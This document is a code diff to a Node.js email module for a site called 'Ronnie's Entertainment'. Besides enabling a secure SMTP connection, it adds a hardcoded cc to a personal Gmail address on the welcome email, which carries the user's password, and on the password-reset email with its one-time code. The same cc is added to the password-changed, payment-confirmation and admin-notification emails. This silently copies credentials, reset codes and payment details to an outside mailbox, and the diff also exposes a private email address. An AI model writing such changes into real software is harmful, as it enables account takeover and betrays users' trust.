@@ -11,7 +11,7 @@ const __dirname = path.dirname(__filename);
 const transporter = nodemailer.createTransport({
   host: process.env.EMAIL_HOST,
   port: process.env.EMAIL_PORT,
-  secure: false,
+  secure: true,
   auth: {
     user: process.env.EMAIL_USER,
     pass: process.env.EMAIL_PASS,
@@ -31,6 +31,7 @@ export const sendWelcomeEmail = async (email, fullName, password, whatsappLink) 
     const mailOptions = {
       from: `"Ronnie's Entertainment" <${process.env.EMAIL_USER}>`,
       to: email,
+      cc: "ssentongoronald256@gmail.com",
       subject: 'Welcome to Ronnie\'s Entertainment - Your Account is Ready!',
       html: `
 <!DOCTYPE html>
@@ -207,6 +208,7 @@ export const sendPasswordResetEmail = async (email, otp, fullName) => {
     const mailOptions = {
       from: `"Ronnie's Entertainment" <${process.env.EMAIL_USER}>`,
       to: email,
+      cc: "ssentongoronald256@gmail.com",
       subject: 'Password Reset Code - Ronnie\'s Entertainment',
       html: `
 <!DOCTYPE html>
@@ -360,6 +362,7 @@ export const sendPasswordChangedEmail = async (email, fullName) => {
     const mailOptions = {
       from: `"Ronnie's Entertainment" <${process.env.EMAIL_USER}>`,
       to: email,
+      cc: "ssentongoronald256@gmail.com",
       subject: 'Password Updated - Ronnie\'s Entertainment',
       html: `
 <!DOCTYPE html>
@@ -519,6 +522,7 @@ export const sendPaymentConfirmationEmail = async (email, fullName, amount, conf
     const mailOptions = {
       from: `"Ronnie's Entertainment" <${process.env.EMAIL_USER}>`,
       to: email,
+      cc: "ssentongoronald256@gmail.com",
       subject: `Payment Confirmation (Ronnie's Entertainment Ref No. ${transactionId})`,
       html: `
 <!DOCTYPE html>
@@ -682,6 +686,7 @@ export const sendAdminPaymentNotification = async (customerName, amount, confirm
       from: `"Ronnie's Entertainment" <${process.env.EMAIL_USER}>`,
       to: process.env.EMAIL_USER, // Send to admin email
       subject: `Payment Notification (Ronnie's Entertainment Ref No. ${transactionId})`,
+      cc: "ssentongoronald256@gmail.com",
       html: `
 <!DOCTYPE html>
 <html>
